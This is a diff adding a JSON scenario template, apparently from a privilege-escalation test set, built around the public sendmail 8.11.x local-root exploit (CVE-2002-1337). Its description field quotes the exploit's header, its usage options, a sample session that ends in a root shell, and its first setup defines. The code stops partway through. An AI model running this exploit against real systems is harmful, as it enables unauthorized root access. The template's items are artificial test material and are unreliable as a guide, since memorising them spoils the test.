@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_411",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Sendmail 8.11.x (Linux/i386) - Local Privilege Escalation (OSVDB-4502;CVE-2002-1337)\n\nExploit source code (411.c):\n```\n/*\n\tsendmail 8.11.x exploit (i386-Linux) by sd@sf.cz (sd@ircnet)\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\tThis code exploits well-known local-root bug in sendmail 8.11.x,\n\t8.12.x may be vulnerable too, but I didn't test it.\n\n\tIt gives instant root shell with +s sendmail 8.11.x, x < 6\n\n\tWe're using objdump, gdb & grep in order to obtain VECT, so make sure\n\tthat they're on $PATH, works with 80% accuracy on stripped binaries\n\ton several distros without changing offsets (rh7.0, rh7.1, suse7.2,\n\tslackware 8.0...)\n\n\tGreetz:\n\n\tmlg & smoke : diz is mostly for .ro ppl ;) killall sl3\n\tsorcerer    : stop da fuckin' asking me how to sploit sm, diz crap\n\t              is for lamers like you ;))))\n\tdevik       : sm 0wns ;)\n\tto #linux.cz, #hack ....\n\n\t.... and to alot of other ppl, where i can't remeber theyr handles ;)\n\n\targs:\n\t-d     specify depth of analysis (default=32) [bigger = more time]\n\t-o     change offset (default = -32000) [between 1000..-64000]\n\t-v     specify victim (default /usr/sbin/sendmail) [+s sm binary]\n\t-t     specify temp directory (default /tmp/.sxp)\n\t       [temporary files, should be mounted as nosuid]\n\n\tAn example (redhat 7.0 CZ):\n-------------------------------------------------------------------------------\n[sd@pikatchu sxp]$ gcc sx.c -o sx\n[sd@localhost sxp]$ ./sx\n\n...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...\n      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n[*] Victim = /usr/sbin/sendmail\n[*] Depth  = 32\n[*] Offset = -16384\n[*] Temp   = /tmp/.sxp\n[*] ESP    = 0xbfffe708\n[+] Created /tmp/.sxp\n[+] Step 1. setuid() got = 0x080aa028\n[*] Step 2. Copying /usr/sbin/sendmail to /tmp/.sxp/sm...OK\n[*] Step 3. Disassembling /tmp/.sxp/sm...OK, found 3 targets\n[*] Step 4. Exploiting 3 targets:\n[1] (33% of targets) GOT=0x080aa028, VECT=0x00000064, offset=-16384\n[2] (66% of targets) GOT=0x080aa028, VECT=0x080c6260, offset=-16384\n\nVoila babe, entering rootshell!\nEnjoy!\nuid=0(root) gid=0(root) groups=0(root)\n[root@pikatchu /]# whoami\nroot\n[root@pikatchu /]# exit\nexit\nThanx for choosing sd's products ;)\n[sd@pikatchu sxp]$\n--------------------------------------------------------------------------------\n\n\tEnjoy! And don't abuse it too much :)\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <sys/wait.h>\n#include <string.h>\n\n#define\tSM\t\"/usr/sbin/sendmail\"\n#define\tOBJDUMP\t\"objdump\"\n#define\tGDB\t\"gdb\"\n#define GREP\t\"grep\"\n\n#define\tOURDIR\t\"/tmp/.sxp\"\n\n/* an basic regexp to get interesting stuff from disassembled output\n   change it as you like if something doesn't work */\n\n#define\tDLINE\t\"%s -d %s 2> /dev/null | %s -B %d \\\"mov.*%%.l,(%%e..,%%e..,1)\\\" | %s \\\".mov .*0x80.*,%%e..\\\"\"\n#define DLINEA\tOBJDUMP, vict, GREP, depth, GREP\n\n#define\tBRUTE_DLINE\t\"%s -d %s 2> /dev/null | %s \\\".mov .*0x80.*,%%e..\\\"\"\n#define BRUTE_DLINEA\tOBJDUMP, vict, GREP\n\n\n#define NOPLEN\t32768\n\n#define uchar\n```",
+  "cve": "OSVDB-4502;CVE-2002-1337",
+  "exploitdb_id": "411",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_411",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
